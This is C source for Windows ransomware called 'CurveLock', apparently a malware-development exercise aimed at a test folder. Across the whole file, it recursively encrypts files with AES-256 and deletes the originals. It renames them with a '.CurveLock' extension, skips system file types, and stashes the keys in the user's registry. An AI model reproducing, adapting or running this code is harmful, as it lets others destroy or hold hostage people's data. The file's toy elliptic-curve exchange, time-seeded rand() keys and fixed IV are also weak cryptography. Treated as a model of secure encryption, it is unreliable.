#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <Windows.h>
#include <bcrypt.h>
#include <shlwapi.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma warning(disable : 4996)

#define ENCRYPTED_FILE_EXTENSION    L".CurveLock"
#define ENC_FILE_SIGNATURE          'CVLK'

#define MAX_FILE_SIZE_TO_ENC        0x6400000 // 104857600 - 100MB
#define AES_KEY_SIZE                32
#define AES_BLOCK_SIZE              16

#define GET_FILE_EXTENSION_W(FilePath)       (wcsrchr(FilePath, L'.') ? wcsrchr(FilePath, L'.') : NULL)

// Registry key to read / write
#define REGISTRY            "Control Panel"

typedef struct _ENCRYPTED_FILE_HEADER {
    BYTE    Signature[0x04];
    BYTE    IV[AES_BLOCK_SIZE];
} ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;

typedef struct {
    int x;
    int y;
} Point;

const int p = 173; // Prime number
const int a = 23;
const int b = 11;
const Point alpha = { 5, 1 }; // A point on the curve

int mod(int a, int b) {
    int r = a % b;
    return r < 0 ? r + b : r;
}

int modInverse(int a, int m) {
    a = mod(a, m);
    for (int x = 1; x < m; x++) {
        if (mod(a * x, m) == 1) {
            return x;
        }
    }
    return -1;
}

Point pointAdd(Point P, Point Q) {
    if (P.x == Q.x && P.y == Q.y) {
        int s = mod((3 * P.x * P.x + a) * modInverse(2 * P.y, p), p);
        int x = mod(s * s - 2 * P.x, p);
        int y = mod(s * (P.x - x) - P.y, p);
        return (Point) { x, y };
    }
    else {
        int s = mod((Q.y - P.y) * modInverse(Q.x - P.x, p), p);
        int x = mod(s * s - P.x - Q.x, p);
        int y = mod(s * (P.x - x) - P.y, p);
        return (Point) { x, y };
    }
}

Point pointMultiply(Point P, int n) {
    Point R = { 0, 0 };
    Point Q = P;
    while (n > 0) {
        if (n % 2 == 1) {
            if (R.x == 0 && R.y == 0) {
                R = Q;
            }
            else {
                R = pointAdd(R, Q);
            }
        }
        Q = pointAdd(Q, Q);
        n /= 2;
    }
    return R;
}

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize, IN LPCSTR lpSubKey) {
    BOOL        bSTATE = TRUE;
    LSTATUS     STATUS = NULL;
    HKEY        hKey = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, lpSubKey);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, lpSubKey, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");

_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

BOOL Aes256EncryptBuffer(BYTE* pbKey, BYTE* pbIV, BYTE* pbData, DWORD cbData, BYTE* pbEncryptedData, DWORD* pcbEncryptedData) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject, cbDataOut, cbResult;
    PBYTE pbKeyObject = NULL;

    if (!pbKey || !pbIV || !pbData || !pbEncryptedData || !pcbEncryptedData) {
        return FALSE;
    }

    // Open an algorithm handle
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        printf("[!] Failed to open algorithm provider\n");
        return FALSE;
    }

    // Calculate the size of the buffer to hold the KeyObject
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) {
        printf("[!] Failed to get object length\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        printf("[!] Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Generate the key from supplied input key bytes
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, pbKey, AES_KEY_SIZE, 0) != 0) {
        printf("[!] Failed to generate symmetric key\n");
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Encrypt the data
    if (BCryptEncrypt(hKey, pbData, cbData, NULL, pbIV, AES_BLOCK_SIZE, pbEncryptedData, *pcbEncryptedData, &cbDataOut, BCRYPT_BLOCK_PADDING) != 0) {
        printf("[!] Failed to encrypt data\n");
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    *pcbEncryptedData = cbDataOut;

    // Clean up
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return TRUE;
}

BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt, int fileIndex) {
    HANDLE                  hSourceFile = INVALID_HANDLE_VALUE,
        hDestinationFile = INVALID_HANDLE_VALUE;
    ULONG_PTR               uFileBufferAddr = NULL,
        uEncryptedFileBufferAddr = NULL,
        uTmpPntrVar = NULL;
    DWORD                   dwTmpSizeVar = 0x00,
        dwFileBufferSize = 0x00,
        dwNumberOfBytesRead = 0x00,
        dwNumberOfBytesWritten = 0x00;
    BOOL                    bResult = FALSE;
    PWCHAR                  pwcDuplicateStr = NULL,
        pwcOgFileExtension = NULL,
        pwcEncryptedFilePath = NULL;
    ENCRYPTED_FILE_HEADER   EncryptedFileHeader = { 0 };
    WCHAR* szBlackListedExtensions[11] = { ENCRYPTED_FILE_EXTENSION, L".exe", L".dll", L".sys", L".ini", L".conf", L".cfg", L".reg", L".dat", L".bat", L".cmd" };

    BYTE pbIV[AES_BLOCK_SIZE] = { 0xCE, 0xD4, 0xAF, 0xBB, 0x50, 0x77, 0x67, 0x7E, 0x2A, 0xF5, 0x12, 0xD1, 0x82, 0xC3, 0x6D, 0x69 };

    if (!szFilePathToEncrypt)
        return FALSE;

    RtlSecureZeroMemory(&EncryptedFileHeader, sizeof(ENCRYPTED_FILE_HEADER));
    memcpy(EncryptedFileHeader.IV, pbIV, AES_BLOCK_SIZE);

    if (!(pwcDuplicateStr = _wcsdup(szFilePathToEncrypt)))
        goto _END_OF_FUNC;

    dwTmpSizeVar = (wcslen(pwcDuplicateStr) + wcslen(ENCRYPTED_FILE_EXTENSION) + 0x01) * sizeof(WCHAR);

    if (!(uTmpPntrVar = pwcEncryptedFilePath = (PWCHAR)malloc(dwTmpSizeVar)))
        goto _END_OF_FUNC;
    else
        swprintf_s(pwcEncryptedFilePath, dwTmpSizeVar, L"%s%s", pwcDuplicateStr, ENCRYPTED_FILE_EXTENSION);

    if (!(pwcOgFileExtension = GET_FILE_EXTENSION_W(szFilePathToEncrypt)))
        goto _END_OF_FUNC;

    for (int i = 0; i < 11; i++) {
        if (wcscmp(pwcOgFileExtension, szBlackListedExtensions[i]) == 0x00) {
            printf("[!] Blacklisted File Extension [%ws] \n", szBlackListedExtensions[i]);
            goto _END_OF_FUNC;
        }
    }

    memcpy(EncryptedFileHeader.Signature, "CVLK", 4);

    if ((hDestinationFile = CreateFileW(pwcEncryptedFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if ((hSourceFile = CreateFileW(szFilePathToEncrypt, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if ((dwFileBufferSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
        printf("[!] GetFileSize Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (dwFileBufferSize >= MAX_FILE_SIZE_TO_ENC) {
        printf("[!] File Size Exceeds The Limit (100MB) \n");
        goto _END_OF_FUNC;
    }

    if (!(uFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)dwFileBufferSize))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(uEncryptedFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)(dwFileBufferSize + sizeof(ENCRYPTED_FILE_HEADER))))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (SetFilePointer(hDestinationFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ReadFile(hSourceFile, uFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesRead, NULL) || dwFileBufferSize != dwNumberOfBytesRead) {
        printf("[!] ReadFile Failed With Error: %d\n", GetLastError());
        printf("[i] Read %d Of %d Bytes\n", dwNumberOfBytesRead, dwFileBufferSize);
        goto _END_OF_FUNC;
    }

    if (*(ULONG*)uFileBufferAddr == ENC_FILE_SIGNATURE) {
        printf("[!] File Already Encrypted \n");
        goto _END_OF_FUNC;
    }

    // Generate random private keys na and nb
    srand((unsigned int)time(NULL));
    int na = rand() % 150 + 1;
    int nb = rand() % 150 + 1;

    // Calculate public keys
    Point Pa = pointMultiply(alpha, na);
    Point Pb = pointMultiply(alpha, nb);

    // Calculate shared secret
    Point Sa = pointMultiply(Pb, na);
    Point Sb = pointMultiply(Pa, nb);

    // Debugging information
    printf("Pa: (%d, %d)\n", Pa.x, Pa.y);
    printf("Pb: (%d, %d)\n", Pb.x, Pb.y);
    printf("Sa: (%d, %d)\n", Sa.x, Sa.y);
    printf("Sb: (%d, %d)\n", Sb.x, Sb.y);

    // Ensure Sa and Sb are the same
    if (Sa.x != Sb.x || Sa.y != Sb.y) {
        printf("[!] ECDH key exchange failed\n");
        goto _END_OF_FUNC;
    }

    // Derive AES key using SHA-256 hash of shared secret
    BYTE sharedSecret[64];
    _snprintf_s((char*)sharedSecret, sizeof(sharedSecret), sizeof(sharedSecret), "%d%d", Sa.x, Sa.y);

    BYTE pbKey[AES_KEY_SIZE];
    BCRYPT_ALG_HANDLE hAlg = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) {
        printf("[!] Failed to open SHA-256 algorithm provider\n");
        goto _END_OF_FUNC;
    }

    if (BCryptHash(hAlg, NULL, 0, sharedSecret, sizeof(sharedSecret), pbKey, AES_KEY_SIZE) != 0) {
        printf("[!] Failed to hash shared secret\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        goto _END_OF_FUNC;
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);

    // Generate a unique registry key name based on the file index
    char regKeyName[MAX_PATH];
    _snprintf_s(regKeyName, sizeof(regKeyName), _TRUNCATE, "CurveLock_%d", fileIndex);

    // Save the generated AES key to the registry
    if (!WriteShellcodeToRegistry(pbKey, AES_KEY_SIZE, regKeyName)) {
        goto _END_OF_FUNC;
    }

    DWORD cbEncryptedData = dwFileBufferSize + AES_BLOCK_SIZE;
    if (!Aes256EncryptBuffer(pbKey, pbIV, (BYTE*)uFileBufferAddr, dwFileBufferSize, (BYTE*)(uEncryptedFileBufferAddr + sizeof(ENCRYPTED_FILE_HEADER)), &cbEncryptedData))
        goto _END_OF_FUNC;

    memcpy((PBYTE)uEncryptedFileBufferAddr, &EncryptedFileHeader, sizeof(ENCRYPTED_FILE_HEADER));

    dwFileBufferSize = cbEncryptedData + sizeof(ENCRYPTED_FILE_HEADER);

    if (!WriteFile(hDestinationFile, uEncryptedFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesWritten, NULL) || dwFileBufferSize != dwNumberOfBytesWritten) {
        printf("[!] WriteFile Failed With Error: %d\n", GetLastError());
        printf("[i] Wrote %d Of %d Bytes\n", dwNumberOfBytesWritten, dwFileBufferSize);
        goto _END_OF_FUNC;
    }

    if (!FlushFileBuffers(hDestinationFile)) {
        printf("[!] FlushFileBuffers Failed With Error: %d\n");
        goto _END_OF_FUNC;
    }

    if (!SetEndOfFile(hDestinationFile)) {
        printf("[!] SetEndOfFile Failed With Error: %d\n");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hSourceFile != INVALID_HANDLE_VALUE)
        CloseHandle(hSourceFile);
    if (hDestinationFile != INVALID_HANDLE_VALUE)
        CloseHandle(hDestinationFile);
    if (pwcDuplicateStr)
        free(pwcDuplicateStr);
    if (uTmpPntrVar)
        free(uTmpPntrVar);
    if (uFileBufferAddr)
        LocalFree((HLOCAL)uFileBufferAddr);
    if (uEncryptedFileBufferAddr)
        LocalFree((HLOCAL)uEncryptedFileBufferAddr);
    return bResult;
}

BOOL EncryptFilesInGivenDir(IN LPCWSTR szDirectoryPath, int* fileIndex) {
    if (!szDirectoryPath)
        return FALSE;

    WIN32_FIND_DATAW    FindFileData = { 0x00 };
    WCHAR               szDirPath[MAX_PATH * 2] = { 0x00 };
    WCHAR               szFullStrPath[MAX_PATH * 2] = { 0x00 };
    HANDLE              hFind = INVALID_HANDLE_VALUE;
    BOOL                bResult = FALSE;

    _snwprintf_s(szDirPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\*", szDirectoryPath);

    if ((hFind = FindFirstFileW(szDirPath, &FindFileData)) == INVALID_HANDLE_VALUE) {
        printf("[!] FindFirstFileW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    do {
        if (!wcscmp(FindFileData.cFileName, L".") || !wcscmp(FindFileData.cFileName, L".."))
            continue;

        _snwprintf_s(szFullStrPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\%s", szDirectoryPath, FindFileData.cFileName);

        if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            printf("[*] Directory: %ws\n", szFullStrPath);
            if (!EncryptFilesInGivenDir(szFullStrPath, fileIndex))
                goto _END_OF_FUNC;
        }

        if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            printf("\t> Encrypting File: %ws ... ", szFullStrPath);
            if (ReplaceWithEncryptedFile(szFullStrPath, (*fileIndex)++)) {
                printf("[+] DONE\n");
            }
            else {
                printf("[-] Failed\n");
            }
        }

    } while (FindNextFileW(hFind, &FindFileData));

    bResult = TRUE;

_END_OF_FUNC:
    if (hFind != INVALID_HANDLE_VALUE)
        FindClose(hFind);
    return bResult;
}

int main() {
    WCHAR DirectoryPath[MAX_PATH] = L"C:\\Users\\MALDEV01\\Desktop\\TestFolder";
    int fileIndex = 1;
    EncryptFilesInGivenDir(DirectoryPath, &fileIndex);
    return 0;
}
